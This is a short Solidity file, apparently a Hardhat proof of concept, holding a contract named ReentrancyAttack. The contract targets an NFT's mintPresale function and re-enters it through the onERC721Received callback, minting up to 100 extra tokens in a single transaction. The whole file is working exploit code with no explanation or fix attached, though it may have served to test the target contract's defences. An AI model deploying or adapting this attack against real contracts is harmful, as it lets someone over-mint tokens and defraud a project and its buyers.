// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


interface MarAbiertoTokenI {
    function mintPresale(address to) external payable;
}

contract ReentrancyAttack is IERC721Receiver  {

    MarAbiertoTokenI NFT;
    uint tokensMinted;

    constructor (address payable _MarAbiertoToken) {
        NFT = MarAbiertoTokenI(_MarAbiertoToken);
    }

    function executeExploit() public {
        NFT.mintPresale(address(this));
    }

    function exploit() internal {
        // if tokens minted are superior to 105, will give an arbitrary error which is due to an recursive stack overflow
        if (tokensMinted < 100) {
            ++tokensMinted;
            console.log(tokensMinted);
            NFT.mintPresale(address(this));
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        exploit();
        return 0x150b7a02;
    }
}